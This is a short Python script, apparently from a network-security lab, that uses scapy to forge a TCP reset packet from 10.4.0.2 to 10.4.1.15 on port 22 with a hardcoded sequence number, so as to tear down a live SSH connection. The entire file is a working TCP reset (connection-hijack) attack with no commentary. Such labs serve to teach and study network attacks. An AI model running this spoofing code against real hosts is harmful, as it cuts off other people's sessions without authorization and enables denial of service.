#!/usr/bin/python3

import sys

from scapy.all import *



print("sending reset packet")

IPLayer = IP(src="10.4.0.2", dst = "10.4.1.15")

TCPLayer = TCP(sport=35200, dport=22, flags="R", seq=1004827855)

pkt=IPLayer/TCPLayer

ls(pkt)

send(pkt,verbose=0)


